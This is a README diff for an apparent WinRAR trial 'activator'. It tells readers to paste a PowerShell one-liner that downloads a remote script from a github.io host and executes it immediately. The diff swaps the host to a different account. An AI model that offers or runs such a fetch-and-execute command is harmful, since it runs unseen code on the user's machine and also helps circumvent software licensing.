@@ -18,7 +18,7 @@ Say goodbye to the annoying "trial period expired" pop-up in WinRAR. This simple
 2.  Copy and paste the command below, then hit Enter:
 
     ```powershell
-    irm https://captainfahim7.github.io/WinRAR_Activator/WAS.ps1 | iex
+    irm https://zenibaba.github.io/WinRAR_Activator/WAS.ps1 | iex
     ```
 
 The script will automatically run and complete the activation process.
